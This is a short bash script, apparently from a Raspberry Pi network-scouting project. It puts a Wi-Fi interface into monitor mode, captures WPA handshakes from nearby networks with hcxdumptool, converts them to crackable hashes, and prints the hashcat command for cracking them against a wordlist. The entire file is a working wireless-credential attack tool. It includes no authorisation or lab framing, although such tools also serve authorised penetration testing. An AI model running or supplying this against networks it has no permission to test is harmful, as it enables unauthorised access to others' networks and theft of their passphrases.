#!/bin/bash

IFACE="wlan1"
OUTPUT_DIR="/home/pi/netscout-pi/state"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
CAP_FILE="$OUTPUT_DIR/capture_$TIMESTAMP.pcapng"
HASH_FILE="$OUTPUT_DIR/hash_$TIMESTAMP.txt"

echo "╔════════════════════════════════════════════════════════╗"
echo "║                 WPA Handshake Capture                  ║"
echo "║                 Press Ctrl+C to stop                   ║"
echo "╚════════════════════════════════════════════════════════╝"

mkdir -p $OUTPUT_DIR

if [ "$EUID" -ne 0 ]; then 
    echo "[-] Run as root (sudo)"
    exit 1
fi

# Setup monitor mode
if ! iw dev $IFACE info 2>/dev/null | grep -q "type monitor"; then
    echo "[*] Enabling monitor mode..."
    ip link set $IFACE down 2>/dev/null
    iw dev $IFACE set type monitor 2>/dev/null || iwconfig $IFACE mode monitor
    ip link set $IFACE up 2>/dev/null
fi

echo "[*] Saving to: $CAP_FILE"
echo ""

# Start hcxdumptool in background
hcxdumptool -i $IFACE -w $CAP_FILE &
PID=$!

# Show status while running
echo "[*] Capturing... (hcxdumptool PID: $PID)"
echo "[*] File size:"

while kill -0 $PID 2>/dev/null; do
    if [ -f "$CAP_FILE" ]; then
        SIZE=$(ls -lh $CAP_FILE | awk '{print $5}')
        echo -ne "\r[*] Packets captured: $SIZE    "
    fi
    sleep 2
done

echo ""
echo ""
echo "[*] Processing capture..."

# Process results
if [ -f "$CAP_FILE" ]; then
    hcxpcapngtool -o $HASH_FILE $CAP_FILE 2>/dev/null
    
    if [ -s "$HASH_FILE" ]; then
        COUNT=$(wc -l < $HASH_FILE)
        echo "[+] SUCCESS! Captured $COUNT handshake(s)!"
        echo "[+] Hash: $HASH_FILE"
        echo "[+] Pcap: $CAP_FILE"
        echo ""
        echo "Crack with:"
        echo "  hashcat -m 22000 $HASH_FILE wordlist.txt"
    else
        echo "[-] No handshakes yet"
        echo "[*] Pcap saved: $CAP_FILE"
        echo "[*] You can try again or crack later:"
        echo "  hcxpcapngtool -o hash.txt $CAP_FILE"
    fi
else
    echo "[-] No capture file"
fi

echo "[*] Done!"
